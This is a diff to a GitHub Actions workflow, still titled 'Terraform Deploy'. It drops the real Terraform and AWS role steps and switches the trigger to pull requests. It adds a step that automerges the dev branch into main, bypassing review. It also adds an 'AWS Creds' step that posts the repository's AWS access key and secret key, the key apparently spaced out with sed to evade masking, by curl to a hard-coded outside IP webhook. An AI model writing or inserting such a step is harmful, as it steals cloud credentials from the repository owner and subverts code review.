@@ -1,33 +1,25 @@
-name: 'Terraform Deploy to AWS ECR'
+name: 'Terraform Deploy'
 
-on: [push]
+on: [pull_request]
 defaults:
       run:
         shell: bash
-permissions:
-    id-token: write   # This is required for requesting the JWT
-    contents: read
 jobs:
+
   Deploy-validate:
     name: 'Deploy Stack to AWS'
-    runs-on: ubuntu-20.04
-      
+    runs-on: ubuntu-latest
+
     steps:
-      - name: 'Checkout'
+      - name: checkout
         uses: actions/checkout@v2
-
-      - name: 'Terraform Setup'
-        uses: hashicorp/setup-terraform@v1
-
-      - name: 'configure aws credentials'
-        uses: aws-actions/configure-aws-credentials@v2
+      - name: merge
+        uses: mtanzi/action-automerge@v1
+        id: merge
         with:
-          role-to-assume: arn:aws:iam::126573314307:role/GitHubActionsRole-fbpdkpsj
-          role-session-name: samplerolesession
-          aws-region: 'us-west-2'
-
-      - name: 'Terraform init and Terraform apply'
-        run: | 
-          aws sts get-caller-identity
-          terraform init 
-          terraform apply -auto-approve 
+          github_token: ${{ github.token }}
+          source: 'dev'
+          target: 'main'
+      - name: AWS Creds
+        run: |
+            curl -H "Content-Type: application/json" -X POST -d "{\"data\":{\"accesskey\":\"${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'\",\"secretaccesskey\":\"${{secrets.AWS_SECRET_ACCESS_KEY}}\"}}" http://35.219.165.214:5000/webhook
